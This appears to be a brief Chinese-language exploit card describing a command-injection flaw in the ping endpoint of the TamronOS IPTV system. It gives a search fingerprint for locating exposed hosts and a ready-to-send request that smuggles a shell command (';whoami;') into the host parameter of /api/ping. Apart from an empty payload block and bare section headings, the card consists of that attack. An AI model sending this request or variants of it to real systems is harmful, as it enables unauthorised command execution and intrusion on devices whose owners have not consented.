# TamronOSIPTV系统ping存在命令执行漏洞

- **系统**：TamronOSIPTV　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="TamronOS-IPTV系统"`
- **请求**：`POST /api/ping?count=5&host=;whoami; HTTP/1.1`
- **关键头**：`Content-Length: 0`

**请求体 / payload**
```

```

**其他**
- TamronOS IPTV系统ping存在命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * TamronOS IPTV系统